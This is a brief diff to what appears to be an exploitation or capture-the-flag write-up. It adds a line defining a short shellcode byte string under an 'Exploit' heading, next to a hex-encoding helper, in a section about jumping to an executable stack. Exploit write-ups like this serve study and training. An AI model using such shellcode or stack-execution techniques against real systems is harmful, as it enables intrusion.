@@ -167,6 +167,7 @@ After marking the stack executable, the program should jump back to the start of
 
 ## Exploit
 ```python
+In [18]: shellcode = b'\x32\x40\x00\xff\xb0\x12\x10\x00'
 In [21]: def b2h(b):
     ...:     return ''.join(f'{c:02x}' for c in b)
     ...: 
